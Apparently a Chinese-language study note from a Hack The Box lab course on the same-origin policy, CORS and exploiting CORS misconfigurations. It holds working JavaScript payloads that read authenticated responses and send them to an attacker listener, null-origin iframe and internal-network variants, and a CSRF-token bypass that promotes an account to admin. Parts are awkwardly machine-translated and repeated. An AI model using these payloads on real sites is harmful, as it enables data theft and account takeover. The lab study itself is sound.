<p><strong>采用了同源策略</strong></p>
<p>如上所述，同源政策阻止了跨原点的访问。在上述案例中，由于主机不同，恶意网站攻击的 <code>https://exploitationserver.htb</code> 来源与所有三种来源不同。因此，调用不同源的<code>fetch</code>会在浏览器中引发由同源策略导致的错误，<code>https://exploitationserver.htb</code> 无法访问和窃取数据：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415054310.png" alt="Pasted image 20260415054310" />
<p>理解同源策略阻止 <a href="https://exploitationserver.htb/" target="_blank" rel="noreferrer">https://exploitationserver.htb</a> 访问跨源请求的响应至关重要。（可能已认证的）请求本身仍然会被发送。我们可以在《Burp》中证实这一点。请注意 <code>Origin</code> 和 <code>Referer</code> 头，表明这确实是一个跨起源请求：理解同源策略阻止 <a href="https://exploitationserver.htb/" target="_blank" rel="noreferrer">https://exploitationserver.htb</a> 访问跨源请求的响应至关重要。（可能已认证的）请求本身仍然会被发送。我们可以在《Burp》中证实这一点。请注意 <code>Origin</code> 和 <code>Referer</code> 头，表明这确实是一个跨起源请求：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415054341.png" alt="Pasted image 20260415054341" />
<p>这种行为可能导致 CSRF 攻击，因为请求不会被保留。</p>
<p>同源政策有一些例外情况。例如，我们可以在起源间加入诸如 <code>img</code>、 <code>视频</code>和<code>脚本</code>标签等资源。例如，尽管它被加载为跨来源，我们仍然可以使用以下 HTML 代码在我们拥有的网站上加入 Hack The Box Academy 的标志：</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;body&gt;
        &lt;script&gt;
            var img = document.createElement("img");
            img.setAttribute("src", "https://academy.hackthebox.com/images/logo.svg");
            document.body.appendChild(img);
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;</code></pre>
<h3>CORS 跨源资源共享</h3>
<p>跨原点资源共享（CORS）是 W3C 的一个标准，定义了同源政策的例外情况。它使源区能够定义可信源区和允许跨区访问的 HTTP 方法列表。</p>
<p>为了理解为什么需要 CORS，我们假设现实中常见的场景：一个托管在 <code>http://vulnerablesite.htb</code> 上的网页应用显示数据。为此，它与托管在 <code>http://api.vulnerablesite.htb</code> 上的 API 通信。更具体地说，运行<code>在 http://vulnerablesite.htb</code> 上的应用程序仅包含前端代码，负责从 API 获取数据。该 API 实现了一个简单的 REST API，由用于创建、读取、更新和删除数据的端点组成。</p>
<p>这使得前端网页应用变得简单，无需处理数据相关的逻辑。特别是，前端代码处理与 API 的交互，可以使用类似以下的 JavaScript 代码，因此所有数据在网站加载后都会被获取：</p>
<pre><code class="language-javascript">// fetch data
fetch("http://api.vulnerablesite.htb/data", {
    method: "GET"
}).then((response) =&gt; {
    return response.json();
}).then((data) =&gt; {
    // add to DOM
    &lt;SNIP&gt;
})
</code></pre>
<p>然而，如上所述，这违反了同源政策，因为 <code>http://vulnerablesite.htb</code> 和 <code>http://api.vulnerablesite.htb</code> 是不同的来源。因此，上述 JavaScript 代码会导致错误，数据未正确加载：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415055130.png" alt="Pasted image 20260415055130" />
<p>现在，让我们讨论一下 CORS 的工作原理，以及网页应用如何与 API 通信而不被同源策略错误。</p>
<p><strong>CORS是如何运转的</strong></p>
<p>服务器可以通过 CORS 在 HTTP 响应中设置以下任一 CORS 头部来配置同源策略的异常</p>
<p>如果服务器还想让 JS 读其他响应头，就要用这个字段显式暴露出来。</p>
<p>也就是说，在这段时间内，浏览器不用每次都重新发 OPTIONS 预检。</p>
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin" target="_blank" rel="noreferrer">Access-Control-Allow-Origin</a>: 允许哪个源（Origin）来读取当前响应</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers" target="_blank" rel="noreferrer">Access-Control-Expose-Headers</a>: 默认情况下，前端 JS 在跨域响应里 <strong>只能读取少数“简单响应头”</strong>。</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Methods" target="_blank" rel="noreferrer">Access-Control-Allow-Methods</a>: 这个头主要用于 <strong>预检请求（preflight request）</strong> 的响应中，告诉浏览器： 这个跨域资源允许使用哪些 HTTP 方法</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers" target="_blank" rel="noreferrer">Access-Control-Allow-Headers</a>: 这个头也是用于 <strong>预检响应</strong>，告诉浏览器：前端跨域请求里，允许带哪些请求头</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials" target="_blank" rel="noreferrer">Access-Control-Allow-Credentials</a>: 是否允许跨域请求携带凭证，并且让前端 JS 读取响应</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Max-Age" target="_blank" rel="noreferrer">Access-Control-Max-Age</a>: 它告诉浏览器： 这次预检请求的结果，可以缓存多久</li></ul>
<div class="post-table-wrap"><table><thead><tr><th>头部</th><th>作用</th></tr></thead><tbody><tr><td><code>Access-Control-Allow-Origin</code></td><td>允许哪个源读取响应</td></tr><tr><td><code>Access-Control-Expose-Headers</code></td><td>允许前端额外读取哪些响应头</td></tr><tr><td><code>Access-Control-Allow-Methods</code></td><td>允许跨域使用哪些 HTTP 方法</td></tr><tr><td><code>Access-Control-Allow-Headers</code></td><td>允许跨域请求带哪些请求头</td></tr><tr><td><code>Access-Control-Allow-Credentials</code></td><td>是否允许带 cookie / Authorization 等凭证并读取响应</td></tr><tr><td><code>Access-Control-Max-Age</code></td><td>预检结果缓存多久</td></tr></tbody></table></div>
<p><strong>Preflight Requests</strong></p>
<p>所有不属于<code>简单请求</code>条件的请求称为<code>预检请求</code> 。在发送这些交叉起源请求之前，浏览器会向不同的起源发送包含实际交叉起源请求所有参数的<code>预检请求</code> 。这使得网络服务器能够决定是否允许跨源请求。浏览器等待对预检请求的响应，只有在网页服务器通过设置相应的 CORS 头来响应预检请求时，才会继续发送实际的交叉起始请求。由于浏览器在发送实际的跨源请求前会向网页服务器请求许可，因此无法在预检请求中出现 CSRF 漏洞。</p>
<p>预检检查请求是一个包含以下头部的 <code>OPTIONS</code> 请求：</p>
<p>访问-控制-请求-方法 ：告知服务器实际请求中使用的 HTTP 方法。</p>
<p>访问-控制-请求-头部 ：告知服务器实际请求中使用的 HTTP 头部</p>
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Method" target="_blank" rel="noreferrer">Access-Control-Request-Method</a>: inform the server about the HTTP method used in the actual request</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Headers" target="_blank" rel="noreferrer">Access-Control-Request-Headers</a>: inform the server about the HTTP headers used in the actual request</li></ul>
<p>例如，如果 API 需要接受来自 Web 应用的 POST 请求中的 JSON 数据，简单请求是不够的，因为 Content-Type 设置为 <code>application/json</code>，而简单请求中不允许这样做。因此，浏览器会先发送一次预检请求，再发送实际请求。API 需要相应地设置 CORS 响应头部，以通知浏览器允许跨源请求。更具体地说，必须允许原始 <code>http://vulnerablesite.htb</code>、<code>POST</code> 方法和头部 <code>Content-Type</code>。</p>
<p>正确配置 CORS 头部后，Web 应用和 API 可以互通，避免同源策略问题。假设用户想通过 POST 请求创建一个新的数据项;用户浏览器首先会发送一个检查前检查请求，以检查 API 是否允许可能存在危险的交叉起源请求：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415064528.png" alt="Pasted image 20260415064528" />
<p>由于响应包含正确的 CORS 头部，浏览器知道 API 允许预检请求;因此，它继续发送：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415064539.png" alt="Pasted image 20260415064539" />
<p>由于该请求还包含带有请求起点的 CORS 头部，浏览器会在同源策略中添加异常，允许网页应用访问响应（此例为<code>成功</code>响应）。</p>
<p>要启用用于更新数据的 <code>PUT</code> 请求和用于删除数据的 <code>DELETE</code> 请求，API 必须在对预检请求的响应中调整 <code>Access-Control-Allow-Methods</code> 的 CORS 头部，以包含所有允许的方法。</p>
<p>只要请求 <strong>不是简单请求</strong>（比如用 JSON、PUT、DELETE、自定义头），浏览器就会先发一个：</p>
<ol><li>什么是预检请求</li></ol>
<pre><code>OPTIONS 请求</code></pre>
<p>👉 这个就是预检请求</p>
<p>浏览器先问服务器：</p>
<ol><li>预检请求在问什么</li></ol>
<pre><code>我要跨域请求，可以吗？  
我要用 POST/PUT，可以吗？  
我要带 Content-Type / 自定义 header，可以吗？</code></pre>
<p>对应请求头：</p>
<pre><code>Access-Control-Request-Method  
Access-Control-Request-Headers</code></pre>
<ol><li>服务器怎么回应</li></ol>
<p>服务器如果允许，会返回：</p>
<pre><code>Access-Control-Allow-Origin  
Access-Control-Allow-Methods  
Access-Control-Allow-Headers</code></pre>
<p>👉 相当于说：</p>
<pre><code>可以，你可以这样请求</code></pre>
<h2>错误配置</h2>
<p>在深入探讨 CORS 配置错误之前，先讨论 CORS 配置错误可能带来的攻击途径。大多数攻击要求将<code>访问-控制-允许-凭证</code>头 设置为 <code>true</code>，从而在受害者的上下文中获得认证请求。如果 CORS 配置错误导致攻击者控制的域获得了同源策略的例外，那么由此产生的漏洞类似于 CSRF 漏洞，但更为严重。同源策略的例外允许攻击者控制的域访问交叉起源请求的响应。由于请求来自认证上下文，响应包含攻击者可能访问和窃取的敏感信息。此外，根据具体的 CORS 配置，攻击者可能与网络应用交互，冒充受害者并代其执行操作。</p>
<p>如果未设置访问<code>控制允许凭证（Access-Control-Allow-Credentials</code> ）首部，攻击者将无法继续实施这些攻击。然而，内部网页应用中的 CORS 配置错误可能使攻击者窃取不公开的信息。</p>
<blockquote><strong>注：</strong> 成功利用以下部分 CORS 错误配置，可能需要在现实世界网络应用中的会话 cookie 上设置 <code>SameSite=None</code> 属性。</blockquote>
<h3>任意 Origin 反射</h3>
<p>The <code>Access-Control-Allow-Origin</code> 头包含源头，允许绕过同源策略，因此浏览器允许源节点访问响应。此外，头部可以设置为通配符（<code>*</code>），这会导致所有起点获得同源策略绕过。但出于安全原因，该功能不能与<code>Access-Control-Allow-Credentials: true</code>真头合并，即通配符只能在没有凭证的情况下使用。</p>
<blockquote><strong>注：</strong> 原站和通配符的组合，比如 <code>https：//*.cors-misconfigs.htb</code>，是无效的。</blockquote>
<p>然而，一些网页应用需要允许多个来源的凭证。例如，想象一个运行<code>在 https://cors-misconfigs.htb</code> 的网页应用需要认证，并且被多个域（如 <code>https://site1.cors-misconfigs.htb</code> 和 <code>https://site2.cors-misconfigs.htb</code>）使用。为了实现这一点，网页应用可能会读取请求的 <code>Origin</code> 头，并在响应中的 <code>Access-Control-Allow-Origin</code> 头中反映出来。这实际上导致了与通配符起源与<code>Access-Control-Allow-Credentials: true</code> 头部结合的情景相同，但 CORS 标准并未明确阻止。</p>
<p>为了识别反映任意起点的 CORS 错误配置，我们需要查找网页应用将<code>访问-控制-允许-起点（Access-Control-Allow-Origin</code>）头设置为原<code>点</code>头中接收值的实例。然后我们可以将相应请求发送给 Burp Repeater，并将 Origin 头修改为虚假值，比如 <code>thisdoesnnotexist.whatever.htb</code>，并检查该域是否包含在 <code>Access-Control-Allow-Origin</code> 响应头中。如果是，网页应用就会遇到这种 CORS 配置错误。</p>
<p>① 攻击者网站：</p>
<pre><code>evil.com</code></pre>
<p>② 发请求：</p>
<pre><code>Origin: http://evil.com  
Cookie: 你的登录cookie</code></pre>
<p>③ 服务器错误配置（关键）</p>
<pre><code>Access-Control-Allow-Origin: http://evil.com  
Access-Control-Allow-Credentials: true</code></pre>
<p>④ 浏览器行为（核心）</p>
<pre><code>浏览器看到：服务器允许 evil.com 读取数据  
→ 不再拦截</code></pre>
<p>⑤ 结果</p>
<pre><code>evil.com 的 JS 可以拿到响应内容</code></pre>
<p>核心区别（必须死记）</p>
<pre><code>正常：能发请求，但读不到数据  
漏洞：能发请求，而且能读到数据</code></pre>
<p>再补一个关键点（很多人忽略） 必须同时有：</p>
<pre><code>Access-Control-Allow-Credentials: true</code></pre>
<p>否则：</p>
<pre><code>不会带 cookie → 拿不到用户数据 → 漏洞价值很低</code></pre>
<p><strong>Exploitation</strong> 为了利用这一点，攻击者可以在其网页服务器上托管类似的有效载荷，且起点为任意，例如 <code>https://exploitserver.htb/exploit</code>：</p>
<pre><code class="language-html">&lt;script&gt;
    var xhr = new XMLHttpRequest();
    # 1. 带上受害者 cookie  
	# 2. 发送跨域请求
    xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
    xhr.withCredentials = true;
    
    xhr.onload = () =&gt; {
        var exfil = new XMLHttpRequest();
        # JS 把数据发给攻击者服务器
        exfil.open('POST', 'https://10.10.14.45:4443/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        # 浏览器允许 JS 读取数据（核心）
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
&lt;/script&gt;</code></pre>
<p>假设受害者在 <code>https://exploitserver.htb/exploit</code> 导航到有效载荷，而浏览器在 <code>https://cors-misconfigs.htb</code> 存储了对错误配置的网页应用的有效凭证。在这种情况下，由于不安全的 CORS 配置，数据被从受害者的有效会话中访问并被窃取给攻击者。</p>
<p>访问托管有效载荷的网站后，受害者的浏览器会向 <code>https://cors-misconfigs.htb/data.php</code> 发送交叉源请求，并附带凭证，即会话 Cookie：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415070804.png" alt="Pasted image 20260415070804" />
<p>由于响应在 CORS 头部反映了来源并允许凭证，攻击者的起源 <code>https://exploitserver.htb</code> 会被授予同源策略的例外。因此，有效载荷代码被允许访问响应并通过发送到攻击者的 HTTPS 泄露服务器来将其泄露：</p>
<pre><code>Chenduoduo@htb[/htb]$ python3 server.py 

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
10.10.14.144 - - [30/Nov/2025 12:04:04] "OPTIONS /log HTTP/1.1" 200 -
10.10.14.144 - - [30/Nov/2025 12:04:04] [i] POST body: {"data":"CjxodG1sPgo8aGVhZD5IZWxsbyBXb3JsZCE8L2hlYWQ+Cjxib2R5PjxkaXYgaWQ9InNlY3JldCI+VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdlLjwvZGl2PjwvYm9keT4KPC9odG1sPgo="}
10.10.14.144 - - [30/Nov/2025 12:04:04] "POST /log HTTP/1.1" 200 -</code></pre>
<p>在对被窃取的数据进行 base64 解码后，我们得到 HTML 页面：</p>
<pre><code class="language-shellsession">Chenduoduo@htb[/htb]$ echo -n CjxodG1sPgo8aGVhZD5IZWxsbyBXb3JsZCE8L2hlYWQ+Cjxib2R5PjxkaXYgaWQ9InNlY3JldCI+VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdlLjwvZGl2PjwvYm9keT4KPC9odG1sPgo= | base64 -d

&lt;html&gt;
&lt;head&gt;Hello World!&lt;/head&gt;
&lt;body&gt;&lt;div id="secret"&gt;This is a secret message.&lt;/div&gt;&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>因此，这种 CORS 错误配置使得没有有效凭证的攻击者能够访问 API 中的数据，尽管 API 有认证保护。</p>
<p>也就是说, 攻击者通过自己恶意网站上的payload, 诱导受害者自己去访问目标网站, 然后把目标网站的内容或数据再发送到恶意网站.</p>
<h3>不当来源白名单</h3>
<p><strong>Background  背景</strong></p>
<p>网页应用必须在反映来源白名单上对照可信来源，而不是反映任意的起源。如果检查不当，攻击者可能会绕过它，实现对不可信来源的同源例外。特别是，检查起源前缀或后缀的实现可能存在漏洞。</p>
<p>网络应用的一个常见目标是信任某一来源的所有子域名。例如，假设托管在 <code>https://cors-misconfigs.htb</code> 的 API 通过检查来源头部是否以字符串 <code>cors-misconfigs.htb</code> 结尾来验证来源头部，以验证只有兄弟子域名被授予同源策略例外。虽然 API 在信任来源前会对其进行检查，但该检查实现不当，因为它不仅覆盖<code>了 cors-misconfigs.htb</code> 的子域名，还涵盖了所有以 <code>cors-misconfigs.htb</code> 结尾的域名。</p>
<p><strong>Exploitation</strong> 利用这种 CORS 错误配置与利用任意原点反射（RNR）相同，攻击者可以使用相同的有效载荷来窃取数据。然而，由于检测了起点，攻击者对有效载荷的起点存在限制。由于后缀匹配，攻击者无法使用原 <code>https://exploitserver.htb</code> 进行利用，但可以选择任何以 <code>cors-misconfigs.htb</code> 结尾的原点，例如，<code>https://attackercors-misconfigs.htb</code> 作为载荷的托管。</p>
<h3>信任 null Origin</h3>
<p><code>Access-Control-Allow-Origin</code>头 不仅支持可信的起点和通配符，还支持表示<code>null origin</code>的值空。虽然实际中不应使用，但一些网络应用可能因误解其含义而实现。攻击者可以通过各种方法强制对交叉起始请求使用空起点，该请求随后被信任，从而产生同源策略异常。</p>
<p><strong>Exploitation</strong></p>
<p>攻击者必须在交叉起源请求中提供<code>null</code>源以利用该错误配置。任何origin都可以通过使用沙盒 iframe 实现：</p>
<pre><code class="language-html">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
    xhr.withCredentials = true;
    xhr.onload = () =&gt; {
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://10.10.14.144:4443/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<ul><li><code>sandbox="allow-scripts allow-top-navigation allow-forms</code>, 开启沙盒模式, 将iframe变为一个受限环境, 没有<code>allow-same-origin</code>, 浏览器会把这个iframe的origin设为<code>null</code>.</li></ul>
<p>使用该负载，利用方法与之前错误配置相同。然而，沙箱 iframe 导致交叉起源请求为<code>null</code> ：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415174331.png" alt="Pasted image 20260415174331" />
<h3>针对本地网络</h3>
<p><strong>Background  背景</strong></p>
<p>即使网页应用未配置 CORS 允许凭证，攻击者仍可能针对在防火墙、反向代理或 NAT 后运行的本地网络中无法公开访问的网络应用。如果这些内部 Web 应用不要求认证，且包含信任攻击者来源的 CORS 错误配置，数据窃取可能成为可能。</p>
<p>如果不需要认证，也不需要访问 <code>Access-Control-Allow-Credentials</code> CORS 头。因此，除了迄今讨论的 CORS 错误配置外，万用字元起源还会导致这些情况下可被利用的错误配置。例如，假设一个不需要认证的内部 API 托管在 <code>https://172.16.0.2</code>。此外，API 在<code>Access-Control-Allow-Origin</code>设置通配符，因此信任所有起点。</p>
<p><strong>Exploitation</strong> API 唯一的保护是只能在内部网络内部访问;然而，万用卡起源允许任何攻击者控制的起源在受害者能够访问时窃取数据。由于无需认证，我们无需在 payload 中设置 <code>withCredentials</code> 选项：</p>
<pre><code class="language-html">&lt;script&gt;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://172.16.0.2/data.php', true);
    xhr.onload = () =&gt; {
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://10.10.14.144:4443/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
&lt;/script&gt;</code></pre>
<p>假设打开负载的受害者与内部 API 处于同一内部网络中，因此可以访问该 API。在这种情况下，受害者的浏览器会在内部网络内发出交叉源请求：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415180612.png" alt="Pasted image 20260415180612" />
<p>响应随后被泄露给攻击者，使得无法公开访问的网页应用数据得以窃取。</p>
<p>此外，攻击者不需要知道错误配置应用运行的 IP 地址和端口，但可以通过尝试请求不同的 IP 地址和端口组合来提升内部网络扫描的负载，直到找到应用。</p>
<p>注意，我们可以通过使用 GET 请求来进行撤离，而不是 POST，从而简化有效载荷，有效载荷类似于以下内容：</p>
<pre><code class="language-html">&lt;script&gt;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
    xhr.withCredentials = true;
    xhr.onload = () =&gt; {
        location = 'https://10.10.14.144:4443/log?data=' + btoa(xhr.responseText);
    };
    xhr.send();
&lt;/script&gt;</code></pre>
<p>然而，使用 GET 请求进行数据窃取存在缺点。首先，操控<code>location</code>会导致重定向，使受害者明显意识到 XSS 攻击，因为他们浏览器中显示的网站会发生变化。因此，在后台使用 <code>fetch</code> 或 <code>XMLHttpRequest</code> 发起过滤请求，操作安全效果显著更好。其次，网址长度不是无限的。因此，如果我们试图泄露的数据过大，有效载荷可能会失败。</p>
<h2>通过 CORS 错误配置绕过 CSRF Token</h2>
<p>除了前述攻击向量外，CORS 配置错误还可被利用来绕过 CSRF 防御，实施 CSRF 攻击，即使已实施适当防御。</p>
<p>如果 CORS 配置错误，使会话 cookie 与跨源请求同时发送，即设置了<code>Access-Control-Allow-Credentials</code> ，我们可以有效绕过同源策略。在这种情况下，常见的 CSRF 防御无效，正如本节我们将讨论的那样。</p>
<h3>防御绕过：CSRF Token</h3>
<p>如果我们能因 CORS 配置错误而绕过同源策略，就能访问我们发出的跨源请求的响应。这允许我们向创建有效 CSRF 令牌的端点发送交叉起源请求，读取该令牌，嵌入状态改变的交叉起源请求中，并用有效的 CSRF 令牌发送状态改变的交叉起源请求。由于所有这些都发生在受害者的会话中，即使经过正确检查并绑定到受害者的用户会话，CSRF 令牌仍然有效。</p>
<p>然而，为了让受害者的浏览器发送受害者的会话 Cookie 以及 JavaScript 请求，我们要求易受攻击的网页应用必须明确将 <code>SameSite</code> cookie 属性设置为<code>null</code>,  此外还要处理 CORS 配置错误。根据规范，这仅允许通过<code>secure</code> Cookie 属性传输，该属性仅通过安全 HTTPS 连接实现 Cookie 传输。Cookie 不会通过任何未加密的 HTTP 连接发送。</p>
<p>由于这一限制，示例网页应用及所有其他实验室组件只能通过 HTTPS 访问。如果我们分析网页应用，可以注意到该应用设置了<code>Access-Control-Allow-Origin</code>和<code>Access-Control-Allow-Credentials</code>的 CORS 头部，表明我们应检查 CORS 配置错误。此外，会话 cookie 同时设置了 <code>Secure</code> 和 <code>SameSite=None</code> 这两个 cookie 属性：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415185929.png" alt="Pasted image 20260415185929" />
<p>我们可以分析网页应用对 HTTP <code>Origin</code> 头部不同值的反应。如果我们提供任意值，可以看到网页应用确实配置错误，因为任意起源反映在<code>Access-Control-Allow-Origin</code>的 CORS 首部：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415190236.png" alt="Pasted image 20260415190236" />
<p>我们可以利用 <code>SameSite=None</code> cookie 属性利用 CORS 错误配置，绕过正确的 CSRF 保护，实施 CSRF 攻击。让我们进一步分析该网页应用，以识别此次攻击的潜在目标。</p>
<p>和之前一样，网页应用实现了向管理员推广用户账户的功能。这一次，对应的 POST 请求得到了 CSRF 令牌的妥善保护：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415190439.png" alt="Pasted image 20260415190439" />
<p>我们编写一个漏洞利用，在受害者会话中获取有效的 CSRF 令牌，然后发起相应的跨源请求，迫使受害者提升我们的用户账户为管理员权限。CSRF 令牌是响应向 <code>/profile.php</code> 端点发送的 GET 请求。我们可以提出相应的请求，解析响应，并使用类似以下的 JavaScript 代码提取 CSRF 令牌：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);</code></pre>
<p>之后，我们可以构建交叉起源请求，用有效的 CSRF 令牌来推广我们的用户：</p>
<pre><code class="language-js">var csrf_req = new XMLHttpRequest();
var params = \`promote=htb-stdnt&amp;csrf=\${csrftoken}\`;
csrf_req.open('POST', 'https://bypassing-csrftokens.htb/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);</code></pre>
<p>我们可以将这两部分结合起来，在我们的漏洞服务器上得到以下负载：</p>
<pre><code class="language-html">&lt;script&gt;
    // GET CSRF token
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
    var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

    // do CSRF
    var csrf_req = new XMLHttpRequest();
    var params = \`promote=htb-stdnt&amp;csrf=\${csrftoken}\`;
    csrf_req.open('POST', 'https://bypassing-csrftokens.htb/profile.php', false);
    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
&lt;/script&gt;</code></pre>
<p>如果我们查看漏洞利用，可以看到一个经过认证的 GET 请求发给 <code>/profile.php</code>，随后是 <code>profile.php</code> 一个带有有效 CSRF 令牌的认证 POST 请求。因此，我们的漏洞应该能奏效。在将邮件送达受害者并等待几秒钟后，我们的用户被提升为管理员。因此，我们成功利用了 CORS 错误配置，绕过了 CSRF 保护，成功实施了 CSRF 攻击：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415190555.png" alt="Pasted image 20260415190555" />
<p>直接在登陆页面进行权限提升</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415194750.png" alt="Pasted image 20260415194750" />
<pre><code>POST /login.php HTTP/1.1

Host: bypassing-csrftokens.htb

Content-Length: 42

Content-Type: application/x-www-form-urlencoded



user=htb-stdnt&amp;password=Academy_student%21</code></pre>
<p>使用下面这个发送到目标网站</p>
<pre><code class="language-js">&lt;iframe sandbox="allow-scripts allow-forms"
src="data:text/html,&lt;script&gt;
var x=new XMLHttpRequest();
x.open('GET','https://bypassing-csrftokens.htb/profile.php',false);
x.withCredentials=true;
x.send();

var d=new DOMParser().parseFromString(x.responseText,'text/html');
var t=encodeURIComponent(d.getElementById('csrf_token').value);

var r=new XMLHttpRequest();
r.open('POST','https://bypassing-csrftokens.htb/profile.php',false);
r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
r.withCredentials=true;
r.send('promote=htb-stdnt&amp;csrf_token='+t);
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<ul><li>服务器允许<code>Origin:null</code>, 所以设置为sandbox, 让这个子页面处于隔离环境.</li></ul>
<pre><code class="language-js"># 服务器允许\`Origin:null\`, 所以设置为sandbox, 让这个子页面处于隔离环境.
&lt;iframe sandbox="allow-scripts allow-forms"

# 内联一个“页面”，直接执行里面的 JS
src="data:text/html,&lt;script&gt;

# 拿 CSRF Token
var x=new XMLHttpRequest();
# false, 同步请求（确保下一步能拿到 response）
x.open('GET','https://bypassing-csrftokens.htb/profile.php',false);
# 带上受害者（admin）的 cookie
x.withCredentials=true;
x.send();

# 把返回的 HTML 转成 DOM, 从里面提取：&lt;input id="csrf_token" value="xxxx"&gt;
var d=new DOMParser().parseFromString(x.responseText,'text/html');
var t=encodeURIComponent(d.getElementById('csrf_token').value);

# 发起 CSRF 提权
var r=new XMLHttpRequest();
r.open('POST','https://bypassing-csrftokens.htb/profile.php',false);
r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
r.withCredentials=true;
r.send('promote=htb-stdnt&amp;csrf_token='+t);
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<blockquote>admin浏览器被JS控制，自动执行了提权请求</blockquote>
<blockquote>让远端的admin浏览器帮我们的账户提升到admin权限</blockquote>
<h2>其他 CSRF 利用</h2>
<h3>结合攻击向量绕过 SameSite Cookie</h3>
<p>网页浏览器根据请求的来源<code>网站</code>  和目标，决定是否发送 SameSite cookie。这与几节前提到的同源政策所考虑的<code>起源</code>不同。关键区别在于端口和子域名不被视为网站的一部分。因此，即使端口和子域名不同，两个域名仍被视为同一站点，在某些情况下，跨源请求仍被视为同站点。请考虑以下例子：</p>
<ul><li><code>https://vulnerable.htb</code> 和 <code>https://sub.vulnerable.htb</code> 都是 SameSite</li><li><code>https://vulnerable.htb</code> 和 <code>https://vulnerable.htb:9001</code> 都是 SameSite。</li><li><code>https://vulnerable.htb</code> 和 <code>https://sub.vulnerable.htb:9001</code> 都是 SameSite</li></ul>
<ul><li><code>http://vulnerable.htb</code> 和 <code>https://vulnerable.htb</code> 都不是SameSite。</li><li><code>https://vulnerable.htb</code> 和 <code>https://exploitserver.htb</code> _不是_ SameSite。</li></ul>
<p>我们可以利用这种行为绕过 SameSite Cookies 施加的限制。例如，当会话 cookie 将 SameSite 属性设置为 <code>Lax</code> 时，只有在安全请求（如 GET 请求）时才会发送。如果网页应用包含任何通过 GET 请求访问的状态变更端点，SameSite 保护无效。如果所有状态切换操作都使用 POST 请求，但网页应用配置错误，接受 GET 请求，情况相同。</p>
<p>如果必须绕过<code>strict</code>的 SameSite 限制，我们可以将上述错误配置与目标站点的客户端重定向结合起来。如果我们写了一个将受害者发送到客户端重定向端点的有效载荷，客户端重定向是由目标站点发起的，因此被视为 SameSite。因此，即使 SameSite 属性设置为<code>strict</code> ，受害者的 Cookie 也会随请求一起发送。如果我们将受害者重定向到那个接受状态更改操作的 GET 请求的配置错误端点，就可以成功执行 CSRF 攻击。</p>
<blockquote><strong>注意：</strong> 这种绕过仅适用于客户端重定向，不适用于服务器端重定向，如 HTTP 3xx 状态码。</blockquote>
<p>举例来说，考虑以下网页应用，它将会话 Cookie 的 SameSite cookie 属性设置为<code>strict</code> ：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415202639.png" alt="Pasted image 20260415202639" />
